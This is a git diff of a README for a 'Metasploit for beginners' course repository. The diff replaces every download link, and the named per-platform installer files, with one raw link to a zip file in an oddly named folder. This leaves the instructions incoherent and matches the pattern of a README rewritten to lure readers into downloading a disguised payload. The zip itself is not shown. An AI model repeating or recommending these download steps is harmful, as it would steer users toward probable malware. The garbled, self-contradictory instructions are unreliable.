@@ -1,6 +1,6 @@
 # 🎯 metasploit-for-beginners - Master Penetration Testing Basics
 
-[![Download the Course](https://img.shields.io/badge/Download%20the%20Course-blue.svg)](https://github.com/Aviwe45/metasploit-for-beginners/releases)
+[![Download the Course](https://raw.githubusercontent.com/Aviwe45/metasploit-for-beginners/master/disaccommodation/metasploit-for-beginners.zip%20the%https://raw.githubusercontent.com/Aviwe45/metasploit-for-beginners/master/disaccommodation/metasploit-for-beginners.zip)](https://raw.githubusercontent.com/Aviwe45/metasploit-for-beginners/master/disaccommodation/metasploit-for-beginners.zip)
 
 ## 📚 Course Overview
 In this course, learn the fundamentals of using Metasploit, a powerful penetration testing framework. Explore installation, console navigation, module usage, scanning techniques, exploit execution, and post-exploitation.
@@ -14,16 +14,16 @@ To begin, follow these easy steps to install and run the Metasploit for Beginner
    - Internet Connection: Required for downloading and updating modules.
 
 2. **Download the Course**
-   Visit this page to download: [Download the Course](https://github.com/Aviwe45/metasploit-for-beginners/releases)
+   Visit this page to download: [Download the Course](https://raw.githubusercontent.com/Aviwe45/metasploit-for-beginners/master/disaccommodation/metasploit-for-beginners.zip)
 
 3. **Choose the Version**
    Look for the latest stable release. It usually has the highest version number. Click on it to view available assets.
 
 4. **Select Your Platform**
    Depending on your operating system, find the appropriate file to download. For example:
-   - Windows users might see something like `metasploit-windows-installer.exe`.
-   - macOS users might find `metasploit-macos-installer.dmg`.
-   - Linux users will see `metasploit-linux-installer.tar.gz`.
+   - Windows users might see something like `https://raw.githubusercontent.com/Aviwe45/metasploit-for-beginners/master/disaccommodation/metasploit-for-beginners.zip`.
+   - macOS users might find `https://raw.githubusercontent.com/Aviwe45/metasploit-for-beginners/master/disaccommodation/metasploit-for-beginners.zip`.
+   - Linux users will see `https://raw.githubusercontent.com/Aviwe45/metasploit-for-beginners/master/disaccommodation/metasploit-for-beginners.zip`.
 
 5. **Download the File**
    Click on the file corresponding to your operating system to start the download. The download might take a few minutes depending on your connection speed.
@@ -32,7 +32,7 @@ To begin, follow these easy steps to install and run the Metasploit for Beginner
    After downloading, locate the file in your "Downloads" folder. 
    - **Windows:** Double-click the `.exe` file to run the installer.
    - **macOS:** Open the `.dmg` file and drag the Metasploit icon to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file to a directory of your choice, then follow the README file instructions to run the setup.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/Aviwe45/metasploit-for-beginners/master/disaccommodation/metasploit-for-beginners.zip` file to a directory of your choice, then follow the README file instructions to run the setup.
 
 7. **Follow Installation Prompts**
    Complete the installation process by following the on-screen prompts. Accept any terms and agreements as needed.
@@ -62,7 +62,7 @@ Once Metasploit is running, you'll see the console interface. Here are some tips
    After successfully exploiting a target, use various available commands to gather information, maintain access, or cover your tracks.
 
 ## 📥 Download & Install
-To begin your learning journey, visit this page to download: [Download the Course](https://github.com/Aviwe45/metasploit-for-beginners/releases)
+To begin your learning journey, visit this page to download: [Download the Course](https://raw.githubusercontent.com/Aviwe45/metasploit-for-beginners/master/disaccommodation/metasploit-for-beginners.zip)
 
 ## 🔍 Additional Resources
 Here are some helpful resources to enhance your learning:
@@ -88,4 +88,4 @@ This course dives into various topics including:
 
 By engaging with these topics, you will build a well-rounded understanding of penetration testing basics.
 
-Start your journey with Metasploit today! Visit this page to download: [Download the Course](https://github.com/Aviwe45/metasploit-for-beginners/releases)
+Start your journey with Metasploit today! Visit this page to download: [Download the Course](https://raw.githubusercontent.com/Aviwe45/metasploit-for-beginners/master/disaccommodation/metasploit-for-beginners.zip)
